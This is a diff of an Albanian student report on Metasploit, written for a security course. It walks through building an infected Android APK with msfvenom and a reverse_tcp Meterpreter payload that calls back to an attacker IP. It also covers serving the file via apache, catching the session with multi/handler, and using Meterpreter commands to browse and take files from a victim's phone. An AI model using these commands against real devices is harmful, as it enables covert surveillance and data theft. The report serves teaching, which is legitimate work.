@@ -4,6 +4,9 @@ title: Analiza e veglës Metasploit
 
 # Analiza e veglës Metasploit
 
+| [Fatbardh Kadriu](https://github.com/FatbardhKadriu) | [Arbena Musa](https://github.com/ArbenaMusa) | [Albana Hysenaj](https://github.com/albanah) |
+| ---------------------------------------------------- | -------------------------------------------- | -------------------------------------------- |
+
 Ky punim është kryer në kuadër të detyrës së dytë në lëndën "Siguria e Informacionit" dhe shembujt e implementuar janë përdorur vetëm për qëllime edukative. Zhvillimi i shembujve të tillë pa dijeninë dhe miratimin e personave të përfshirë si viktima konsiderohet jolegale.
 
 ## Teknologjitë dhe pajisjet e përdorura
@@ -71,11 +74,11 @@ Matching Modules
    .............................................................................................................................
 ```
 
-Payload `android/meterpreter/reverse_tcp` përdoret për pajisjet android. Meterpreter është shkurtesë për meta interpreter që është një payload i fuqishëm dhe mund të mbuloj tërë funksionalitetin e një command shell. Punon me injektim të DLL fajlla dhe qëndron tërësisht në memorje, duke mos lënë asnjë gjurmë të ekzistencës së tij në hard drive ose skedar. Ka një numër komandash dhe skriptash specifike të zhvilluara për të, duke na mundësuar që në masë të madhe të realizohen qëllimet tona në pajisjen e viktimës. Reverse_tcp nënkupton që përdoret meterpreter si reverse shell që është një shell në të cilin pajisja e targetuar si viktimë, komunikon përsëri mbrapsht me pajisjen sulmuese. Pajisja sulmuese cakton një port për dëgjim në të cilin pret lidhjen me viktimën dhe përmes përdorimit të të cilit realizohet ekzekutimi i komandave pasuese.
+Payload `android/meterpreter/reverse_tcp` përdoret për pajisjet android. Meterpreter është shkurtesë për meta interpreter që është një payload i fuqishëm dhe mund të mbuloj tërë funksionalitetin e një command shell. Punon me injektim të DLL fajlla dhe qëndron tërësisht në memorje, duke mos lënë asnjë gjurmë të ekzistencës së tij në hard drive ose folder. Ka një numër komandash dhe skriptash specifike të zhvilluara për të, duke na mundësuar që në masë të madhe të realizohen qëllimet tona në pajisjen e viktimës. Reverse_tcp nënkupton që përdoret meterpreter si reverse shell që është një shell në të cilin pajisja e targetuar si viktimë, komunikon përsëri mbrapsht me pajisjen sulmuese. Pajisja sulmuese cakton një port për dëgjim në të cilin pret lidhjen me viktimën dhe përmes përdorimit të të cilit realizohet ekzekutimi i komandave pasuese.
 
 ![Reverse Shell](/Foto/reverse_shell.png)
 
-Android Meterpreter mundëson marrjen e informatave nga skedarët e sistemit, përgjimin e thirrjeve telefonike, leximin dhe dërgimin e mesazheve, leximin e log të telefonatave, përdorimin e kamerave të pajisjes, etj.
+Android Meterpreter mundëson marrjen e informatave nga folderët e sistemit, përgjimin e thirrjeve telefonike, leximin dhe dërgimin e mesazheve, leximin e log të telefonatave, përdorimin e kamerave të pajisjes, etj.
 
 ### Krijimi i android aplikacionit të infektuar
 
@@ -93,7 +96,7 @@ $ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.12 LPORT=4444 R > 
 | R                          | raw format                                                           |
 | > /root/Desktop/OurApp.apk | lokacioni ku ruhet APK aplikacioni i krijuar                         |
 
-### Kalimi aplikacionit të infektuar tek viktima
+### Kalimi i aplikacionit të infektuar tek pajisja e targetuar
 
 Për shkak që shumica e platformave online e detektojnë një fajll i cili ka përmajtje kërcënuese për sigurinë, kalimin e fajllit të infektuar nga sulmuesi tek viktima e bëjmë përmes web serverit të apache në linux. Sulmuesi e vendos fajllin e infetuar në lokacionin `/var/www/html/` dhe pajisja e viktimës duhet u çasur në browser në IP adresën e sulmuesit mund të gjej aplikacionin dhe ta instaloj. Komandat për ta startuar apache serverin janë:
 
@@ -102,7 +105,7 @@ $ service apache2 start
 $ service apache2 status
 ```
 
-### Shfrytëzimi i pajisjes të targetuar
+### Shfrytëzimi i pajisjes së targetuar
 
 Shembulli jonë e përdorë modulin exploit/multi/handler duke specifikuar payload, hostin i cili pret kthimin e lidhjes prapa dhe portin në të cilin dëgjohet lidhja. Komanda exploit fillon kërkimin e dobësive dhe në momentin që vendoset lidhja me aplikacionin e infektuar hapet meterpreter dhe nga aty e tutje mund të manipulohet pajisja e viktimës.
 
@@ -122,6 +125,8 @@ Sapo viktima ta ketë instaluar aplikacionin e infektuar dhe të tentojë ta hap
 
 ## Komandat e Meterpreter
 
+### Komandat kryesore
+
 ```
 Core Commands
 =============
@@ -133,6 +138,15 @@ Core Commands
     bg                        Alias for background
 
 ```
+
+#### background dhe bg
+
+Background e kalon lidhjen (sesionin) e krijuar nga payload me viktimën aktuale në prapavijë dhe mundëson që të ekzekutohen komanda të tjera në msfconsole. bg është shkurtesa për background. Për t'iu rikthyer një sesion që është krijuar më herët në msfconsole ekzekutohen komandat si në vijim
+
+- `sessions` - shfaq listën e të gjithë sesioneve aktivë.
+- `sessions -i <numri i session>` - e merr nga prapavija sesionin e caktuar në bazë të numrit të specifikuar dhe kalon në meterpreter shell për atë sesion.
+
+### Komandat e file sistemit
 
 ```
 Stdapi: File system Commands
@@ -149,6 +163,32 @@ Stdapi: File system Commands
     pwd           Print working directory
     search        Search for files
 ```
+
+#### cat
+
+`cat` është komand e cila shfaq në ekran përmbajtjen e një fajlli. Shkruhet njejtë si kur përdoret për leximin e fajllave të pajisjes sulmuese e si të pajisjes së viktimës.
+
+#### cd dhe lcd
+
+`cd` (change directory) mundëson navigimin në folderët ruajtuar në pajisjen e viktimës (kalimin nga një folder në tjetrin), ndërsa lcd mundëson navigimin në folderët e ruajtur në pajisjen sulmuese.
+
+#### ls dhe lls
+
+`ls` (list) printon të gjithë përmbajtjen e lokacionit aktual tek pajisja e viktimës, ndërsa lls printon të gjithë përmbajtjen e lokacionit aktual tek pajisja e sulmuesit.
+
+#### pwd dhe lpwd
+
+`pwd` (print working directory) tregon lokacionin e folderit aktual në pajisjen e viktimës, ndërsa lpwd tregon lokacionin e folderit aktual në pajisjes e sulmuesit.
+
+#### search
+
+`search` kërkon fajlla të caktuar në tërë memorien e pajisjes së kompromentuar përderisa nuk ceket ndonjë pjesë specifike brenda folderëve.
+
+- `-d` specifikon folderin në të cilin kërkohet
+- `-f` pattern i cili kërkohet
+- `-r` kërkimi rekurzis nëpër folderët mbrenda folderit të cekur.
+
+### Komandat e rrjetit
 
 ```
 Stdapi: Networking Commands
@@ -213,11 +253,3 @@ Application Controller Commands
     app_run        Start Main Activty for package name
     app_uninstall  Request to uninstall application
 ```
-
-## Grupi i parë
-
-[Fatbardh Kadriu](https://github.com/FatbardhKadriu)
-
-[Arbena Musa](https://github.com/ArbenaMusa)
-
-[Albana Hysenaj](https://github.com/albanah)
